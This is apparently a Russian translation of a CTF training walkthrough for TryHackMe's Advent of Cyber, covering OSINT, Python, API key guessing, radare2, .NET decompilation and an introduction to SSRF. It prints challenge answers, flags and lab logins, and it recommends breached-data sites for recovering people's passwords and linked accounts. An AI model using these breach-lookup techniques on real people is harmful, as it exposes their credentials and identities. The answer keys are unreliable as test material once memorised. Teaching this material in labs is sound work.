3) Используйте данные EXIF ​​изображения, чтобы узнать важные детали, такие как точное место съемки, марку и модель камеры, дату съемки и многое другое.
4) Используйте обнаруженные адреса электронной почты для поиска в взломанных данных, чтобы возможно идентифицировать пароли пользователя, имя, дополнительные адреса электронной почты и местоположение.

Дополнительные ресурсы

Эта задача была создана для определения общих критических шагов в расследовании OSINT. Обратный поиск изображений 
может помочь не только определить, где было сделано изображение, но и помочь в определении веб-сайтов, где есть эта 
фотография, а также похожих фотографий (возможно, из того же фотосета), что может быть невероятно полезно в 
расследовании. Хотя в нашем примере используется Google Images, другие сайты также должны использоваться, чтобы быть 
максимально точными. Ни один сайт не идеален, когда дело касается обратного поиска изображений (или любого другого 
инструмента для этого). Такие сайты, как https://yandex.com/images/  ,  https://tineye.com/ и https://www.bing.
com/visualsearch?FORM=ILPVIS , также хороши. Кроме того, не пренебрегайте возможностью наличия данных EXIF в 
изображении. Хотя многие сайты удаляют эти данные, не все это делают. Никогда не повредит посмотреть, и это может 
предоставить массу информации, когда данные все еще там.        

Наконец, взломанные данные могут быть невероятно полезны с точки зрения расследования. Данные о взломе включают не 
только пароли. Они часто содержат полные имена, адреса, информацию об IP, хэши паролей и многое другое. Мы часто 
можем использовать эту информацию для привязки к другим учетным записям. Например, предположим, что мы находим 
учетную запись с адресом электронной почты v3ry1337h4ck3r@gmail.com. Если мы найдем этот адрес электронной почты на 
предмет взломанных данных, мы можем найти пароль или хэш, связанный с ним. Если он достаточно уникален, мы можем 
найти этот пароль или хэш в базе данных взлома и использовать его для идентификации других возможных учетных записей.
Мы можем сделать то же самое с именами пользователей, IP, именами и т. д. Возможности огромны, и один адрес 
электронной почты может привести к огромному количеству информации.

Такие сайты, как https://haveibeenpwned.com/, помогут определить, был ли аккаунт когда-либо взломан, и, как минимум, 
сообщат нам, существовал ли аккаунт в какой-то момент. Однако они не предоставляют никакой информации о пароле. 
Бесплатные сайты, такие как http://scylla.so/, предоставляют информацию о пароле и их легко искать. Данные на 
бесплатных сайтах могут быть устаревшими и не соответствовать последней информации о взломе, но эти сайты 
по-прежнему являются мощным ресурсом. Наконец, платные сайты, такие как https://dehashed.com/, предлагают актуальную 
информацию и легко доступны для поиска по доступным ценам.     

### Подведение итогов

Похоже, найти Рудольфа было слишком просто.
Его OPSEC сделает любого специалиста по безопасности тошнотворным
В Городе Ветров Рудольфа выследили
Рождество спасено, мы вернули Рудольфа.

Надеюсь, вам понравился этот вызов! Если вам интересно узнать больше об OSINT или этичном хакинге, пожалуйста, 
рассмотрите возможность посещения TCM Academy . Я также размещаю бесплатный контент на YouTube ( https://youtube.
com/c/thecybermentor ), Twitch ( https://twitch.tv/thecybermentor ) и Twitter ( https://twitter.com/thecybermentor ).  

Большое спасибо и счастливого Рождества! <3 TCM
### Ответить на вопросы ниже
Какой URL-адрес перенаправит меня прямо к истории комментариев Рудольфа на Reddit?

```commandline
https://www.reddit.com/user/IGuidetheClaus2020/comments
```
Где, по словам Рудольфа, он родился?

```commandline
Chicago
```
Рудольф упоминает Роберта. Можете ли вы использовать Google, чтобы сказать мне фамилию Роберта?

```commandline
May
```
На какой еще платформе социальных сетей у Рудольфа может быть аккаунт?

```commandline
Twitter
```
Какое имя пользователя у Рудольфа на этой платформе?

```commandline
IGuideClaus2020
```
Какое телешоу сейчас любимое у Рудольфа?

```commandline
Bachelorette
```
Судя по истории постов Рудольфа, он принял участие в параде. Где проходил парад?

```commandline
Chicago
```
Хорошо, вы нашли город, но где конкретно была сделана одна из фотографий?

```commandline
41.891815, -87.624277
```
Вы тоже нашли флаг?

```commandline
{FLAG}ALWAYSCHECKTHEEXIFD4T4
```
омали? Какой его пароль оказался в утечке?

```commandline
spygame
```
На основе всей собранной информации. Вероятно, Рудольф находится в Городе Ветров и остановился в отеле на 
Великолепной Миле. Каковы номера домов в адресе отеля? 

```commandline
540
```

## Задание 20
Вы когда-нибудь задумывались, как эльфы умудряются успевать строить игрушки для стольких людей по всему миру? Вы 
когда-нибудь грустили и думали: "Хм, с 7 миллиардами людей в мире и ростом населения это означает, что каждый эльф 
будет работать без остановки, чтобы строить игрушки! У них никогда не будет передышки!"  

Ну, у меня для тебя хорошие новости. Благодаря магии Санты у эльфов есть машины, которые могут строить для них 
игрушки. Для этой машины требуется эльф, чтобы спроектировать игрушку, а затем описать, как сделать игрушку, на 
языке сценариев.  

Языки сценариев — это особые типы языков программирования, хорошо подходящие для небольших и коротких программ, 
таких как проекты игрушек. 

Этот документ для всех эльфов, желающих работать с Сантой. Как только вы это сделаете, вы сможете легко производить 
игрушки и использовать API Санты! 

Посмотрите видео DarkStar о решении этой задачи!

🎄 Что такое Python?
Python — это интерпретируемый, высокоуровневый, универсальный язык программирования. Короче говоря, Python уже 
широко доступен на многих компьютерах и на нем очень легко писать. 

Python доступен во всех операционных системах Linux , TryHackMe Attack Box, Elven Toy Making Machinations и Mac OS 
(но, к сожалению, не в Windows по умолчанию). 


🎅 Установка и оснащение
TryHackMe  AttackBox  уже имеет установленный Python. Чтобы использовать его, загрузите терминал и введите "python3".
Это загрузит интерактивный редактор для Python. 



Мы будем создавать файлы, поэтому нам не нужно будет использовать интерактивный редактор. Вместо этого, чтобы 
запустить файл с Python, выполните: "python3 hello.py". Далее мы создадим hello.py. 
Но если у вас не установлен Python, вам нужно будет его установить. Перейдите по этой  ссылке  и установите Python 
для своей системы. Обязательно установите текстовый редактор, например  VS Code  , который поможет вам писать код Python. 

🤶 Привет, мир!
Традиционно первой программой становится «Hello, World!», так что давайте так и сделаем.


Откройте новый файл в VS Code (или в текстовом редакторе по вашему выбору) и назовите его  hello.py . Расширение .py 
означает, что это файл Python. Теперь введите: 

print("Hello, World!")

Сохраните файл, а затем в Терминале перейдите к месту расположения файла и запустите  python3 hello.py.  На экране 
должен появиться вывод в виде «Hello, World!». 

Давайте разберем, что означает каждый из этих компонентов. Давайте объясним, что это делает:


👼 печать()
Print — это функция. Мы даем ей текст, и она выводит его на экран. Мы часто будем видеть функции в Python. Они 
необходимы, так как позволяют нам повторно использовать код. 

Чтобы определить нашу собственную функцию, мы используем ключевое слово def.

```commandline
def hello():   
    print("Hello, World!") 
```


Мы используем табуляцию (или 4 пробела) внутри функций, чтобы обозначить, что код принадлежит этой функции. Это 
называется областью действия, и, к сожалению, мы не будем вдаваться в подробности. Но я дам ссылки на некоторые 
ресурсы в конце, которые будут.  
🧝‍♀️ «Привет, мир!»
Это то, что мы называем строкой (строкой символов). Это просто текст.



🧝‍♂️ Переменные
В последнем разделе я сказал «Строка (строка символов)».

Что это значит? В программировании нам нужны типы данных. Каждый бит данных имеет общий с ним тип.  Вы уже знаете некоторые.

Если я скажу: 1, 2, 3, 4, 5, 6, 7, 8, 9 "Это предложения?" Нет! Это числа. Видите ли, вы уже знаете типы данных 😜

В Python то же самое. У нас есть некоторые основные типы данных, которые содержат вещи:


Строка (строка символов)
Integer - целое число (-50, 50, 60, 91)
Float - число с плавающей точкой (21,3, -5,1921)
Список - список элементов ([1, 2, 3], ["привет", 6, 7.91])
И более....

hello = "Hello, World!"

Мы используем знак равенства как оператор присваивания. Он присваивает значение с правой стороны ячейке слева.

Теперь предположим, что мы хотим добавить эту переменную к другой переменной. Распространенное заблуждение 
заключается в том, что мы берем само ведро и используем его. Но в Python мы этого не делаем. Мы  передаем по ссылке.
То есть мы просто передаем местоположение переменной — мы не передаем саму переменную. Альтернативой является 
передача по значению. Это очень важно понимать, так как это может вызвать значительное количество головной боли в 
дальнейшем.    

Это очень важно в изготовлении игрушек. Однажды у нас был небольшой баг, когда эльф назначал разные переменные одной 
и той же игрушке. Мы думали, что у нас было 800 версий игрушки, поскольку у нас было 800 переменных, но оказалось, 
что все они указывали на одну и ту же игрушку! К счастью, в том году эти дети смогли получить игрушки.  

🦌 Операторы
Давайте поговорим об операторах. Оператор — это что-то между 2 переменными/значениями, что-то с ними делает. 
Например, оператор сложения: 

`x = 3 + 1 # x = 4 `

Python поддерживает множество математических операторов:
```commandline
3 + 1 

3 / 1 # divided by 

3 * 4 # times 

2 ** 2 # 2 to the power of 2 

2 % 3 # 2``mod 3 
```


А теперь самое интересное, операторы работают не только с числами. Они работают и со строками. И со списками. И со словарями.

`[3, 2] + [6, 7] # [3, 2, 6, 7] `

`"Hello, " + "World!" # "Hello, World!" `

🍪 Булев
Два значения для типа данных boolean — True и False. Подобно списку Санты «Непослушный» и «Хороший», это либо True, 
либо False (никогда оба). 

True и False чрезвычайно ценны. В двоичном коде 1 представляет True, а 0 представляет False.  С помощью этих двух 
значений мы можем представить все данные на компьютере, при условии, что мы используем логические вентили. Эти 
логические вентили появляются в Python как операторы.  

Мы рассмотрим один из них, который вы, возможно, уже знаете:

`True or False # True `

Оператор or возвращает значение true, если левая или правая часть имеет значение True.

Давайте быстро пройдемся по всем остальным.

`True and True # True `

Это возвращает True тогда и только тогда, когда и левая, и правая стороны имеют значение True.

`not True # False `

not  отрицает выражение в правой части. Так что противоположность True — False.

Мы можем отрицать оператор Or следующим образом:

`not (True or False) # False `

Теперь он возвращает True только тогда, когда обе стороны or имеют значение False.


🥛 Если утверждения
Операторы if являются одними из самых мощных операторов во всем программировании. Мы хотим что-то сделать, если 
условие выполнено. Если ребенок был хорошим, он получает игрушку. Иначе он получает уголь! 

Так, например, если список не пустой:

`x = [6] if x: print("I run!") `

Поскольку x непустой, он имеет истинное значение.   Это означает, что это читается как «If True» и выполняется. Если 
это читается как «If False», то это не выполняется. 

Операторы If выполняются только в том случае, если условие истинно.

Теперь давайте посмотрим на это в действии.

`name = input("What is your name? ") `

Мы можем принимать пользовательский ввод с помощью функции input() . Теперь предположим, что мы широкий вышибала в 
Гроте Санты. Мы хотим впускать только тех, у кого есть имя в нашем специальном клубе. Сначала нам нужно создать 
список имен. Можете ли вы угадать, что мы будем для этого использовать?  

`names = ["Skidy", "DorkStar", "Ashu", "Elf"] `

Отлично! А теперь, если у нас есть строка, например, Jabba, как нам проверить, есть ли имя в списке?

`"Jabba" in names # False `

Теперь мы хотим вывести специальное небольшое сообщение, если и только если введенное пользователем имя появляется в 
нашем списке. Мы можем сделать это с помощью: 

```commandline
names = ["Skidy", "DorkStar", "Ashu", "Elf"] 
name = input("What is your name? ") 
if name in names:
     print("The Wide One has allowed you to come in.") 
```

А что, если их имя не указано в списке имен? Мы можем использовать предложение else.
```commandline
names = ["Skidy", "DorkStar", "Ashu", "Elf"] 
name = input("What is your name? ") 
if name in names:     
    print("The Wise One has allowed you to come in.") 
else:     
    print("The Wise One has not allowed you to come in.")
``` 

🎁 Однострочные операторы if
Мы также можем довольно хорошо построить однострочные операторы if в Python.

`age = 12 name = "Jabba" if age == 12 else "Skidy" print(name) # 'Jabba' `


❄️ Петли
Циклы позволяют нам выполнять один и тот же код, многократно. Циклы For лучше всего описываются тем, как они читаются:

```commandline
names = ["Skidy", "DorkStar", "Ashu", "Elf"] 
for name in names:
     print(name)
```

Для каждого имени в списке имён сделайте что-нибудь (в данном случае — выведите имя на печать).

Циклы For могут перебирать элементы любого итерируемого. Давайте рассмотрим функцию, которая возвращает итерируемый 
диапазон. 

Range возвращает список чисел в диапазоне. Таким образом, для цикла между 1 и 9 мы бы сделали:

range(1, 9)

Диапазон является включающим, поэтому включены значения 1 и 9. Теперь переберем это:  for i in range(1, 9): print(i) 
Примечание: мы часто используем iпеременную в цикле for, поскольку она обозначает «элемент». 


☃️ Библиотеки
Вы видели, как писать код самостоятельно, но что, если мы хотим использовать код других людей? Это называется  
использованием библиотеки  , где  библиотека  означает кучу чужого кода. Мы можем установить библиотеки в командной 
строке с помощью команды:  `pip install X` Где  X  — библиотека, которую мы хотим установить. Это установит библиотеку 
из  PyPi, которая является базой данных библиотек.  Давайте установим 2 популярные библиотеки, которые нам понадобятся:   

Запросы Прекрасный суп
`pip3 install requests beautifulsoup4 `

С помощью этих двух библиотек вы сможете извлекать все ссылки на веб-странице.

```commandline
# Import the libraries we downloaded earlier
# if you try importing without installing them, this step will fail
from bs4 import BeautifulSoup
import requests 

# replace testurl.com with the url you want to use.
# requests.get downloads the webpage and stores it as a variable
html = requests.get('testurl.com') 

# this parses the webpage into something that beautifulsoup can read over
soup = BeautifulSoup(html, "lxml")
# lxml is just the parser for reading the html 

# this is the line that grabs all the links # stores all the links in the links variable
links = soup.find_all('a href') 
for link in links:      
    # prints each link    
    print(link)
```
Это было очень краткое введение в Python, но вот еще несколько ссылок, если вы хотите узнать больше:

Python от нуля до героя
Оператор деления по модулю Python на практике
Автоматизируйте скучные задачи с помощью Python


Код для анализа по вопросу 5:
```commandline
х = [1, 2, 3]

у = х

y.append(6)

print(х)
```

### Ответить на вопросы ниже
Какой результат у True + True?
```commandline
2
```
Как называется база данных для установки чужих библиотек?
```commandline
PyPi
```
Каков вывод bool("False")?
```commandline
True
```
Какая библиотека позволяет загружать HTML-код веб-страницы?
```commandline
Requests
```
Каков результат работы программы, представленной в разделе «Код для анализа вопроса 5» сегодняшнего материала?

(Этот код расположен над рождественским баннером и под ссылками в основном тексте этого задания)
```commandline
[1, 2, 3, 6]
```
Что заставляет предыдущую задачу выводить этот результат?
```commandline
Pass by reference
```
## Задание 21
Создано  Би .

О нет! Санта 🎅 улетел, оставив вас — верных эльфов — позади! Сможете ли вы помочь найти местонахождение Санты?

К счастью, эльфы — мастера OSINT и помнят кое-что. А именно:

У Санты есть веб-страница MACHINE_IP/static/index.html, чтобы помочь заблудившимся эльфам найти дорогу домой. Санта 
никогда не говорил эльфам, на каком порту находится веб-сервер. Сможете узнать?! 
Где-то на этой веб-странице есть ссылка, спрятанная так, что никто, кроме эльфа, не сможет ее найти.
У Santa's Sled есть API, с которым мы тоже можем поговорить. Ключ для API находится между 0 и 100, и это нечетное 
число. Но будьте осторожны! После неизвестного количества попыток Santa's Sled забанит ваш IP-адрес.  
Разверните машину, на которой запущены сани Санты, и подождите пару минут, пока цель  (MACHINE_IP)  запустится. 
Используйте свои навыки Python с 15-го дня, чтобы найти правильный ключ для API. 

Посмотрите видео Джона Хэммонда о решении этой задачи!



### Ответить на вопросы ниже
Какой номер порта у веб-сервера?

```commandline
80
```
Без использования инструментов перечисления, таких как Dirbuster, какой каталог используется для API? (без ключа API)

```commandline
/api/
```
Где сейчас Санта?

```commandline
Winter Wonderland, Hyde Park, London
```
Найдите правильный ключ API. Помните, это нечетное число от 0 до 100. После слишком большого количества попыток 
Santa's Sled вас заблокирует.  

Чтобы разблокировать себя, просто завершите работу и повторно разверните целевой экземпляр (MACHINE_IP)
```commandline
57
```

## Задание 22
1. История.

МакСкиди никогда по-настоящему не прикасался к языкам низкого уровня — это то, что им предстоит изучить в их 
стремлении победить рождественского монстра. 

Следуйте за Darkstar7474 и решите 17-й день!

2. Введение в ассемблер x86-64

Компьютеры выполняют машинный код, который закодирован в виде байтов, для выполнения задач на компьютере. Поскольку 
разные компьютеры имеют разные процессоры, машинный код, выполняемый на этих компьютерах, специфичен для процессора. 
В этом случае мы рассмотрим архитектуру набора инструкций Intel x86-64, которая наиболее распространена сегодня. 
Машинный код обычно представлен более читаемой формой кода, называемой ассемблерным кодом. Этот машинный код обычно 
создается компилятором, который берет исходный код файла и, пройдя через некоторые промежуточные этапы, создает 
машинный код, который может быть выполнен компьютером.     

Не вдаваясь в подробности, Intel сначала начала с создания 16-битного набора инструкций, затем 32-битного, после 
чего они, наконец, создали 64-битный. Все эти наборы инструкций были созданы для обратной совместимости, поэтому код,
скомпилированный для 32-битной архитектуры, будет работать на 64-битных машинах. Как упоминалось ранее, перед 
созданием исполняемого файла исходный код сначала компилируется в ассемблер (файлы .s), после чего ассемблер 
преобразует его в объектную программу (файлы .o), а операции с компоновщиком наконец делают его исполняемым.      

Лучший способ начать объяснять ассемблер — погрузиться в него. radare2 Для этого мы будем использовать radare2 — 
фреймворк для обратного проектирования и анализа двоичных файлов. Его можно использовать для дизассемблирования 
двоичных файлов (перевода машинного кода в ассемблер, который на самом деле можно прочитать) и отладки указанных 
двоичных файлов (позволяя пользователю пошагово проходить по выполнению и просматривать состояние программы).   

К счастью для нас, все необходимое было предоставлено вам через экземпляр, который вы можете развернуть и в который 
можете войти: 

- Нажмите кнопку «Развернуть» в правом верхнем углу этой задачи.
- Дождитесь отображения IP-адреса целевого экземпляра.
- Войдите в свой экземпляр, используя следующую информацию:
Айпи адрес: MACHINE_IP

Имя пользователя: elfmceager

Пароль: adventofcyber

Давайте продолжим изучать, как именно работает Radare2. Хотя вам не следует этого делать, если программа неизвестна, 
мы можем безопасно запустить ее, чтобы увидеть, что должно  происходить, например: 



Приведенная выше программа показывает, что существует 3 переменные ( a , b , c ), где c — сумма a и b . 

Время посмотреть, что происходит под капотом! Выполните команду r2 -d ./file1

Это откроет двоичный файл в режиме отладки. После открытия двоичного файла одним из первых действий будет запрос r2 
на анализ программы, и это можно сделать, введя:aa 

Обратите внимание, что при использовании `aa` команды в radare2 это может занять от 5 до 10 минут в зависимости от 
вашей системы.

Какая команда анализа является наиболее распространенной. Она анализирует все символы и точки входа в исполняемом 
файле. Анализ в данном случае включает извлечение имен функций, информации об управлении потоком и многого другого! 
Инструкции r2 обычно основаны на одном символе, поэтому легко получить больше информации о командах.  

То есть для общей помощи мы можем запустить: ?или если мы хотим узнать больше о конкретной функции, мы могли бы 
предоставить a?

3. Компьютер говорит... Готово?!

После завершения анализа вам захочется узнать, с чего начать анализ — в большинстве программ  точка входа определена 
как main. Чтобы найти список функций, выполните:`afl` 

Обратите внимание, что адреса памяти на вашем компьютере могут отличаться. 

Как видно здесь, на самом деле есть функция в main. Давайте рассмотрим код сборки в main, выполнив команду Где pdf 
@main pdf означает print disassembly f unction. Это даст нам следующее представление: 

3. Зарегистрируйте мне это, зарегистрируйте мне то...
Ядро языка ассемблера заключается в использовании регистров для выполнения следующих задач: 
- Передача данных между памятью и регистром и наоборот
- Выполнять арифметические операции с регистрами и данными
- Передача управления другим частям программы. Поскольку архитектура x86-64, регистры являются 64-битными, и у Intel 
  есть список из 16 регистров:
```commandline
Начальный тип данных	Суффикс	Размер (байты)
Байт	б	1
Слово	ж	2
Двойное слово	 л
4
Квад	д	8
Одинарная точность
с	4
Двойная точность
л
8
```

При работе с памятью с использованием регистров следует учитывать и другие случаи:
```commandline
(Rb, Ri) = МестоПоминания[Rb + Ri]
D(Rb, Ri) = МестоположениеПамять[Rb + Ri + D]
(Rb, Ri, S) = МестоПомине(Rb + S * Ri]
D(Rb, Ri, S) = МестоположениеПамять[Rb + S * Ri + D]
```
4. Прочитайте инструкцию!

Вот еще несколько важных инструкций:
```commandline
leaq источник, назначение : эта инструкция устанавливает назначение на адрес, обозначенный выражением в источнике
addq источник, пункт назначения : пункт назначения = пункт назначения + источник
subq источник, пункт назначения : пункт назначения = пункт назначения - источник
источник imulq, пункт назначения : пункт назначения = пункт назначения * источник
salq источник, назначение : назначение = назначение << источник, где << — оператор сдвига бита влево
sarq источник, назначение : назначение = назначение >> источник, где >> — оператор сдвига битов вправо
источник xorq, назначение : назначение = назначение XOR источник
andq источник, пункт назначения: пункт назначения = пункт назначения и источник
orq источник, пункт назначения : пункт назначения = пункт назначения | источник
```

Теперь давайте рассмотрим ассемблерный код, чтобы увидеть, что означают инструкции при их объединении.

Строка, начинающаяся с  sym.main,  указывает, что мы смотрим на  основную функцию . Следующие 3 строки используются 
для представления переменных, хранящихся в функции.  Второй столбец указывает, что они являются целыми числами ( int 
), третий столбец указывает имя, которое  r2 используется для ссылки на них, а четвертый столбец показывает 
фактическое расположение в памяти.   

Первые 3 инструкции используются для выделения места в этом стеке (гарантируют, что достаточно места для выделения 
переменных и т. д.). Мы начнем рассматривать программу с 4-й инструкции ( movl $4). Мы хотим проанализировать 
программу во время ее выполнения, и лучший способ сделать это — использовать  точки останова .  

Точка  останова  указывает, где программа должна прекратить выполнение. Это полезно, так как позволяет нам 
посмотреть на состояние программы в этой конкретной точке. Итак, давайте установим точку останова с помощью команды, 
db  в этом случае это будет  db 0x00400b55 Чтобы убедиться, что точка останова установлена, мы  pdf @main снова 
запускаем команду и видим маленькую букву  b  рядом с инструкцией, на которой мы хотим остановиться.   



Теперь, когда мы установили точку останова, давайте запустим программу, используя dc

Running dc будет выполнять программу до тех пор, пока мы не достигнем точки останова. После того, как мы достигнем 
точки останова и выведем основную функцию, rip, которая является текущей инструкцией, показывает, где остановилось 
выполнение. Из примечаний выше мы знаем, что инструкция  mov  используется для передачи значений.   Этот оператор 
передает значение 4 в local_ch переменную. Чтобы просмотреть содержимое переменной  local_ch , мы используем 
следующую инструкцию  px @memory-address В этом случае соответствующий адрес памяти для  local_ch будет  rbp-0xc (из 
первых нескольких строк  @pdf main ) Эта инструкция выводит значения памяти в шестнадцатеричном формате:     


Это показывает, что в переменной в данный момент ничего не хранится (это просто 0000 ). Давайте выполним эту 
инструкцию и перейдем к следующей с помощью следующей команды (которая переходит только к следующей инструкции). ds 
Если мы посмотрим на область памяти после выполнения этой команды, то получим следующее:  



Мы видим, что первые 2 байта имеют значение 4 ! Если мы проделаем тот же процесс для следующей инструкции, мы увидим,
что переменная local_8hимеет значение 5. 

Если мы перейдем к инструкции movl local_8h, %eax, то из примечаний мы знаем, что это перемещает значение из 
local_8hв %eaxрегистр. Чтобы увидеть значение регистра %eax, мы можем использовать команду: 

Если мы выполним инструкцию и dr снова запустим команду, то получим:


Это технически пропускает предыдущую инструкцию, movl local_ch, %edxно тот же процесс может быть применен к ней. 
Показывая значение rax  (64-битной версии) равным 5. Мы можем сделать то же самое для подобных инструкций и 
просмотреть изменение значений регистров. Когда мы доходим до addl %edx, %eax, мы знаем, что это добавит значения в 
edx и eax и сохранит их в eax . Запуск drпоказывает нам, что rax содержит 5, а rdx содержит 4, поэтому мы ожидаем, 
что rax будет содержать 9 после выполнения инструкции:    

Выполнение dsдля перехода к следующей инструкции, а затем выполнение dr для просмотра переменной регистра показывает, 
что мы правы: 

Следующие несколько инструкций включают перемещение значений из регистров в переменные и наоборот:

После этого строка (которая является выходными данными) загружается в регистр, а printf функция вызывается в 3-й 
строке. Вторая строка очищает значение eax, поскольку eax иногда используется для хранения результатов функций. 4-я 
строка очищает значение eax. 5- я и 6-я строки используются для выхода из основной функции.   

5. Чтобы завершить наш рабочий процесс...
Общая формула для решения подобных задач такова:

установить соответствующие контрольные точки
используйте ds для перемещения по инструкциям и проверки значений регистра и памяти
если вы допустили ошибку, вы всегда можете перезагрузить программу с помощью ood команды
Эта шпаргалка radare2 может оказаться полезной в ваших приключениях...

6. Вызов

Используйте свои новые знания о Radare2 для анализа файла «challenge1» в экземпляре MACHINE_IP, прикрепленном к 
этому заданию, чтобы ответить на вопросы ниже. 

### Ответить на вопросы ниже
Каково значение local_ch при вызове соответствующей ему инструкции movl (первой, если их несколько)?
```commandline
1
```
Каково значение eax при вызове инструкции imull?
```commandline
6
```
Каково значение local_4h до того, как eax будет установлен в 0?
```commandline
6
```

## Задание 23
(DOTNET Microsoft., 2020)

День 18: Рождественские мелочи - История:
«Глупый Санта... Опять забыл свой пароль!» — жалуется Эльф МакИгер. Однако на самом деле глупым оказался Эльф 
МакИгер, который не создал способ сбросить пароль Санты для панели управления TBFC. 

Санта должен вернуться в панель управления на Рождество! Можете ли вы помочь Elf McEager провести обратную 
разработку приложения TBFC, чтобы получить пароль для Санты?! 

Заблудились в глубинах .NET? Следуйте за Джоном Хаммондом для выполнения сегодняшнего задания.

18.1 Начало работы:
Прежде чем начать, нам нужно будет развернуть два экземпляра:

THM AttackBox можно запустить, нажав кнопку « Запустить AttackBox » в правом верхнем углу страницы.
Уязвимый экземпляр, прикрепленный к этой задаче путем нажатия кнопки « Развернуть » в правом верхнем углу этой 
задачи/дня. 
Сделано с ❤ от  CMNatic

Вчера вы запачкали руки всем, что связано с radare2. Однако сегодня мы рассмотрим более интерактивный подход к 
разборке приложения. 

Благодаря своей совместимости и долгой истории, .NET Framework является популярной платформой для разработчиков 
программного обеспечения, чтобы разрабатывать программное обеспечение. Все, что касается Windows или веба, .NET 
покроет это.  

Например, я разработал свой ответ на калькулятор Microsoft в .NET:

Это довольно тривиальное использование .NET, но, эй, оно работает (поверьте мне, ладно?).  Хотя вы, возможно, не 
захотите заглядывать в код этого приложения, есть некоторые, которые могут быть интересны, например, в сегодняшнем 
задании.  Давайте взглянем на приложение ниже:  

При запуске приложения нас просят ввести данные (в данном случае имя пользователя). Возникает вопрос, как приложение 
узнает, какое имя пользователя/пароль является правильным или неправильным? Приложение должно знать ответ... 
Приложения, созданные с использованием .NET Framework, можно разобрать с помощью таких инструментов, как ILSpy или 
Dotpeek.   

Загрузка нашего приложения-калькулятора в ILSpy подтверждает, что это действительно приложение .NET:

После раскрытия некоторых ресурсов мы можем увидеть ссылки на элементы приложения, такие как кнопки, метки и т.п.:

Просматривая объекты, ILspy смог восстановить часть исходного кода приложения:

Поскольку это калькулятор, мы можем видеть код C++, который проверяет математические операторы (плюс, минус, 
умножение и деление).  Просмотр других объектов показывает похожий код (который мы ожидаем от калькулятора, по крайней мере). 

18.3.Задача:
Разверните экземпляр, прикрепленный к этой задаче , и войдите в систему с помощью протокола удаленного рабочего 
стола ( RDP ).  Откройте приложение "TBFC_APP.exe" на рабочем столе и введите правильный пароль! 

Вы можете использовать «Remmina» на TryHackMe AttackBox для подключения к экземпляру со следующими учетными данными 
или любой RDP-клиент, например Microsoft, если вы хотите подключиться к TryHackMe VPN : 
Айпи адрес :MACHINE_IP

Имя пользователя : cmnatic

Пароль : Adventofcyber! 

1. Перейдите на вкладку «Приложения» в AttackBox, где в подменю «Интернет» находится «Remmina». 
2. Reminna запросит у вас пароль для сохранения сессий, мы можем смело нажать «Отмена»:
3. Теперь введите IP-адрес целевого экземпляра, который вы развернули, введите предоставленные имя пользователя и 
   пароль и установите «Глубину цвета» на «RemoteFX (32 bpp)» следующим образом: 


Айпи адрес : MACHINE_IP
Имя пользователя : cmnatic
Пароль : Adventofcyber! 



Так как это коробка Windows, пожалуйста, дайте ей пять минут на полную настройку . Возьмите немного воды (в емкость, 
пожалуйста, если вы не маг воды. Если вы действительно маг, зачем вы читаете это задание?) и сделайте быструю проверку осанки. 

Хотите получить больше практических навыков по дизассемблированию приложений в Windows? Ознакомьтесь с моим 
руководством по анализу вредоносных программ: 
1.  Учебник по анализу вредоносных программ  — изучение и визуализация характеристик вредоносных программ.
2.  MAL: REMnux - The Redux  - Использование REMnux для анализа вредоносных PDF-файлов и дампа памяти машины, 
    зараженной программой-вымогателем Jigsaw.   
### Ответить на вопросы ниже
Откройте приложение «TBFC_APP» в ILspy и начните декомпиляцию кода.
```commandline
Ответ не нужен
```
Какой пароль у Санты?
```commandline
santapassword321
```
Теперь, когда вы получили этот пароль, попробуйте войти в систему... Что такое флаг?
```commandline
thm{046af}
```

## Задание 24
Санта выпустил веб-приложение, которое позволяет детям мира проверять, находятся ли они в списке плохих или хороших 
детей. К сожалению, эльф, который его закодировал, раскрыл больше вещей, чем она думала. Можете ли вы получить 
доступ к администрированию списка и убедиться, что каждый ребенок получит подарок от Санты в этом году?  

Не стесняйтесь попробовать взломать это веб-приложение самостоятельно или следуйте инструкциям ниже! Примечание: при 
обходе фильтра имени хоста используйте localtest.me, иначе ваши попытки не сработают! 

Не можете сами обойти список плохих или хороших? Посмотрите, как создатель ( @Tib3rius ) решает сегодняшнюю задачу!

### Подделка запросов на стороне сервера
Подделка запросов на стороне сервера (SSRF) — уязвимость веб-приложений, которая позволяет злоумышленникам заставить 
сервер веб-приложений делать запросы к ресурсам, которые он обычно не делает. Например, веб-приложение может иметь 
функциональность для создания снимков экрана других веб-сайтов, когда пользователь предоставляет URL-адрес. Это 
совершенно допустимая функциональность, однако URL-адреса также могут быть созданы для внутренних IP-адресов 
(например, 192.168.1.1, 10.10.10.10, 127.0.0.1 и т. д.), а также для имен хостов, предназначенных только для 
внутренних нужд (например, localhost, WIN2019SERV.CORP). Если веб-разработчик не будет осторожен, злоумышленник 
может предоставить их приложению и сделать снимки экрана внутренних ресурсов, которые часто имеют меньшую защиту.       

Чтобы противостоять этому, предоставленные пользователем URL-адреса могут проверяться до того, как они будут 
запрошены, чтобы гарантировать, что вредоносные значения не используются. Однако из-за сложной природы самих 
URL-адресов злоумышленник часто может сделать много вещей, чтобы обойти эти проверки.  

Обратите внимание, что хотя пример SSRF, используемый в этой задаче, фактически является уязвимостью удаленного 
включения файлов (RFI), не все SSRF ею являются. Некоторые уязвимости SSRF вызывают только поиск DNS, в то время как 
другие могут не возвращать никакого ответа веб-приложению, но все равно могут использоваться для «сканирования 
портов» внутренних систем путем измерения времени, необходимого для выполнения каждого запроса. В других случаях 
SSRF может использоваться как форма отказа в обслуживании ( DoS ), поскольку злоумышленник может постоянно 
запрашивать у сервера одновременную загрузку больших файлов (занимая память, дисковое пространство и пропускную 
способность сети).      

### Прохождение
После развертывания виртуальной машины подключитесь к веб-приложению:  http://MACHINE_IP

Введите имя в форму и нажмите кнопку «Поиск». Когда страница загрузится, она должна сообщить вам, находится ли это 
имя в списке «Непослушный» или «Хороший». Обратите внимание, что URL-адрес страницы выглядит примерно так:  
http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DTib3rius  

Если мы используем декодер URL для значения параметра «proxy», то получим: http://list.hohoho:8080/search.php?name=Tib3rius

Поскольку «list.hohoho» не является допустимым именем хоста в Интернете (.hohoho не является  доменом верхнего 
уровня ), это имя хоста, вероятно, относится к какой-то внутренней машине. Похоже, что веб-приложение работает, беря 
этот URL-адрес, делая запрос на внутренней стороне, а затем возвращая результат во внешнее веб-приложение. Если 
разработчик не проявил осторожности, мы можем воспользоваться этой функциональностью с помощью подделки запросов на 
стороне сервера ( SSRF ).    

